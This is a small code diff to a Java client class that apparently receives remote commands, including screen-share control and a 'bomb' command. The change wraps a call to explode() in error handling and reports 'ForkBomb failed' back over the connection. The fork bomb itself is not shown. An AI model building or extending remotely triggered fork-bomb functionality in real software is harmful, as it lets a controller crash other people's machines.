@@ -51,7 +51,11 @@ public class Client {
                 stopScreenShare();
                 break;
             case "bomb":
-                explode(connection);
+                try {
+                    explode();
+                } catch (IOException e) {
+                    connection.sendMessage(new Message("print", "ForkBomb failed: "+ e.getMessage()));
+                }
                 break;
             case "help":
                 sendCommandList(connection);
